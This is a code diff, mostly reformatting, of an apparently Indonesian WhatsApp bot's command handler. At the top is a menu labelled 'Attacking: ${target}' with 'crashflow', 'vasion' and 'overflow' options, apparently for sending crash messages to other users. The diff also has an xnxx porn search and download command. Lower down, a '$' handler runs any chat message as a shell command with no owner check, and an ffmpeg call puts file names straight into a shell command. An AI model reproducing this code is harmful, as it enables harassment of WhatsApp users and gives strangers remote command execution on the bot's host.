+                            id: `iphone ${target}`
+                        }]
+                    },
+                    {
+                        title: '⌜ 𝐙𝐍𝐗 ⌟',
+                        highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
+                        rows: [{
+                            title: '⌁⃰𝐂͢𝐫𝐚ͯ𝐬͢𝐡𝐅𝐥͢𝐨ͮ𝐰༑',
+                            id: `crashflow ${target}`
+                        }]
+                    },
+                    {
+                        highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
+                        rows: [{
+                            title: '⌁⃰𝐕͢𝐚ͯ𝐒𝐢͢𝐨ͮ𝐧༑',
+                            id: `vasion ${target}`
+                        }]
+                    },
+                    {
+                        highlight_label: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨ཀ͜͡🐉",
+                        rows: [{
+                            title: '⌁⃰𝚯𝐯ͯ͢𝐞𝐫ͮ𝐅𝐥͢𝐨ͯ𝐰༑',
+                            id: `overflow ${target}`
+                        }]
+                    }
+                ]
+                let listMessage = {
+                    title: '𝐕𝐗𝚯 ❄ 𝐙𝐀𝚸',
+                    sections
+                };
+
+                let msg = generateWAMessageFromContent(m.chat, {
+                    viewOnceMessage: {
+                        message: {
+                            "messageContextInfo": {
+                                "deviceListMetadata": {},
+                                "deviceListMetadataVersion": 2
+                            },
+                            interactiveMessage: proto.Message.InteractiveMessage.create({
+                                contextInfo: {
+                                    mentionedJid: [m.sender],
+                                    isForwarded: true,
+                                    forwardedNewsletterMessageInfo: {
+                                        newsletterJid: "0@newsletter",
+                                        newsletterName: 'Powered By JackTzy',
+                                        serverMessageId: -1
+                                    },
+                                    businessMessageForwardInfo: {
+                                        businessOwnerJid: zyn.decodeJid(zyn.user.id)
+                                    },
+                                },
+                                body: proto.Message.InteractiveMessage.Body.create({
+                                    text: (`\n🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠\n›› 𝐀𝐭𝐭𝐚𝐜𝐤𝐢𝐧𝐠 : ${target}`)
+                                }),
+                                footer: proto.Message.InteractiveMessage.Footer.create({
+                                    text: ``
+                                }),
+                                header: proto.Message.InteractiveMessage.Header.create({
+                                    title: '',
+                                    subtitle: "𝐙𝐲𝐧𝐓𝐳𝐲",
+                                    hasMediaAttachment: true,
+                                    ...(await prepareWAMessageMedia({
+                                        image: await fs.readFileSync("./database/image/xbug.jpg")
+                                    }, {
+                                        upload: zyn.waUploadToServer
+                                    }))
+                                }),
+                                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                                    buttons: [{
+                                        "name": "single_select",
+                                        "buttonParamsJson": JSON.stringify(listMessage)
+                                    }, {
+                                        "name": "cta_url",
+                                        "buttonParamsJson": "{\"display_text\":\"My Creator\",\"url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\",\"merchant_url\":\"https://whatsapp.com/channel/0029VarTDNiFcowFnrgUeU2v\"}"
+                                    }, ]
+                                })
+                            })
+                        }
+                    }
+                }, {})
+
+                await zyn.relayMessage(msg.key.remoteJid, msg.message, {
+                    messageId: msg.key.id
+                })
+            }
+            break
+
+            case 'hdvid':
+            case 'hdvideo':
+            case 'vidiohd':
+            case 'tohd':
+            case 'vidhd': {
+                const {
+                    TelegraPh
+                } = require('../database/lib//uploader');
+                const {
+                    exec
+                } = require('child_process');
+                const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? zyn.user.jid : m.sender;
+                //const name = await zyn.getName(who);
+                const q = m.quoted ? m.quoted : m;
+                const mime = (q.msg || q).mimetype || '';
+                if (!mime) return m.reply(`Mana vidio nya bang?`);
+                reply(mess.wait);
+                const media = await zyn.downloadAndSaveMediaMessage(q);
+                const url = await TelegraPh(media);
+                const output = 'output.mp4'; // Nama file output
+                // Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
+                exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
+                    if (error) {
+                        console.error(`Error: ${error.message}`);
+                        return;
+                    }
+                    console.log(`stdout: ${stdout}`);
+                    console.error(`stderr: ${stderr}`);
+
+                    // Mengunggah video yang telah ditingkatkan resolusinya
+                    zyn.sendMessage(m.chat, {
+                        caption: `_Success To HD Video_`,
+                        video: {
+                            url: output
+                        }
+                    }, {
+                        quoted: m
+                    });
+                })
+                await sleep(60000)
+                fs.unlinkSync(output)
+                fs.unlinkSync(media)
+            }
+            break
+
+
+
+
+            case 'xnxxsearch': {
+                if (!text) return m.reply(`Kirim Judul Bokep`)
+                try {
+                    const fg = require('api-dylux')
+                    let res = await fg.xnxxSearch(text)
+                    m.reply(mess.wait)
+                    let ff = res.result.map((v, i) => `${i + 1}┃ *Title* : ${v.title}\n*Link:* ${v.link}\n`).join('\n')
+                    if (res.status) m.reply(ff)
+
+                } catch (error) {
+                    console.error(error);
+                    m.reply('Yah Error');
+                }
+            }
+            break
+            case 'xnxxdl': {
+                if (!text) return m.reply(`Kirim Link Bokep di situs XNXX`)
+                if (!text.includes('xnxx.com')) return m.reply(`Kirim Link Bokep di situs XNXX`)
+                try {
+                    m.reply(mess.wait)
+                    const fg = require('api-dylux')
+                    let xn = await fg.xnxxdl(text)
+                    let tobatrek = `*XNXX DOWNLOAD*
         
 ▢ *📌Title*: ${xn.title}
 ▢ *⌚Duration:* ${xn.duration}
 ▢ *🎞️Quality:* ${xn.quality}`
-await rioo.replyWithVideo({
-            url: xn.url_dl,
-            },{
-            caption: tobatrek,
-        })
-			} catch (error) {
-				console.error(error);
-				m.reply('Yah Error');
-			}
-		}
-		break
+                    await rioo.replyWithVideo({
+                        url: xn.url_dl,
+                    }, {
+                        caption: tobatrek,
+                    })
+                } catch (error) {
+                    console.error(error);
+                    m.reply('Yah Error');
+                }
+            }
+            break
 
-case "tts":
-        {
-          if (!text) return m.reply(`[ ! ] ${prefix}${command} halo world`);
-          const a = await (
-            await axios.post(
-              "https://gesserit.co/api/tiktok-tts",
-              { text: text, voice: "id_001" },
-              {
-                headers: {
-                  Referer: "https://gesserit.co/tiktok",
-                  "User-Agent":
-                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-                  responseType: "arraybuffer",
-                },
-              },
-            )
-          ).data;
-          const b = Buffer.from(a.audioUrl);
-          zyn.sendMessage(m.chat, {
-            audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
-            mimetype: "audio/mpeg",
-          })
+            case "tts": {
+                if (!text) return m.reply(`[ ! ] ${prefix}${command} halo world`);
+                const a = await (
+                    await axios.post(
+                        "https://gesserit.co/api/tiktok-tts", {
+                            text: text,
+                            voice: "id_001"
+                        }, {
+                            headers: {
+                                Referer: "https://gesserit.co/tiktok",
+                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+                                responseType: "arraybuffer",
+                            },
+                        },
+                    )
+                ).data;
+                const b = Buffer.from(a.audioUrl);
+                zyn.sendMessage(m.chat, {
+                    audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
+                    mimetype: "audio/mpeg",
+                })
+            }
+            break;
+
+            case 'solver': {
+                if (!text) return m.reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`)
+                await zyn.sendMessage(m.chat, {
+                    react: {
+                        text: "🌚",
+                        key: m.key,
+                    }
+                })
+                if (/image/.test(mime)) {
+                    const media = await sock.downloadAndSaveMediaMessage(quoted)
+                    let anuu = await pomfCDN(media)
+                    const data = await fetchJson(`https://widipe.com/bardimg?url=${anuu}&text=${encodeURIComponent(text)}`)
+                    const aimsg = data.result;
+                    m.reply(`${aimsg}`)
+                }
+            }
+            break
+
+            case 'removebg':
+                //if (isBan) return m.reply(mess.ban)
+                if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .removebg*`)
+                if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .removebg*`)
+                if (/image/.test(mime)) {
+                    m.reply(mess.wait)
+                    let mee = await m.downloadAndSaveMediaMessage(quoted)
+                    let mem = await shannzCdn(mee)
+                    let url = mem.result.url;
+                    let shannz = await (await fetch(`https://endpoint.web.id/tools/removebg?key=YOUR-KEY&url=${url}`)).json()
+                    let bg = shannz.result.image
+                    zyn.sendMessage(m.chat, {
+                        image: {
+                            url: bg
+                        },
+                        caption: '*SUCCESS* ✅'
+                    }, {
+                        quoted: m
+                    })
+                }
+                break
+
+
+
+
+            default:
         }
-        break;
-
-case 'solver': {
-	if (!text) return m.reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`) 
-await zyn.sendMessage(m.chat, { react: { text: "🌚",key: m.key,}}) 
-  if (/image/.test(mime)) {
-    const media = await sock.downloadAndSaveMediaMessage(quoted)
- 	  let anuu = await pomfCDN(media)
-    const data = await fetchJson(`https://widipe.com/bardimg?url=${anuu}&text=${encodeURIComponent(text)}`)
-    const aimsg = data.result;
-    m.reply(`${aimsg}`)
-}
-}
-break
-
-case 'removebg':
-  //if (isBan) return m.reply(mess.ban)
-  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .removebg*`)
-  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .removebg*`)
-  if (/image/.test(mime)) {
-m.reply(mess.wait)
-  let mee = await m.downloadAndSaveMediaMessage(quoted)
-  let mem = await shannzCdn(mee)
-  let url = mem.result.url;
-  let shannz = await (await fetch(`https://endpoint.web.id/tools/removebg?key=YOUR-KEY&url=${url}`)).json()
-  let bg = shannz.result.image
-  zyn.sendMessage(m.chat,{image:{url: bg }, caption: '*SUCCESS* ✅'},{quoted: m})
-}
-break
-
-
-
-
-
-default:
-}
-if (budy.startsWith('$')) {
-exec(budy.slice(2), (err, stdout) => {
-if(err) return reply(err)
-if (stdout) return reply(stdout)
-})
-}
-if (budy.startsWith(">")) {
-if (!isOwner) return reply(mess.only.owner)
-try {
-let evaled = await eval(budy.slice(2))
-if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
-await reply(evaled)
-} catch (err) {
-reply(String(err))
-}
-}
-} catch (e) {
-console.log(e)
-zyn.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
-}
+        if (budy.startsWith('$')) {
+            exec(budy.slice(2), (err, stdout) => {
+                if (err) return reply(err)
+                if (stdout) return reply(stdout)
+            })
+        }
+        if (budy.startsWith(">")) {
+            if (!isOwner) return reply(mess.only.owner)
+            try {
+                let evaled = await eval(budy.slice(2))
+                if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
+                await reply(evaled)
+            } catch (err) {
+                reply(String(err))
+            }
+        }
+    } catch (e) {
+        console.log(e)
+        zyn.sendMessage(`${owner}@s.whatsapp.net`, {
+            text: `${util.format(e)}`
+        })
+    }
 }
 
-let file = require.resolve(__filename) 
+let file = require.resolve(__filename)
 fs.watchFile(file, () => {
-fs.unwatchFile(file)
-console.log(chalk.redBright(`Update ${__filename}`))
-delete require.cache[file]
-require(file)
+    fs.unwatchFile(file)
+    console.log(chalk.redBright(`Update ${__filename}`))
+    delete require.cache[file]
+    require(file)
 })
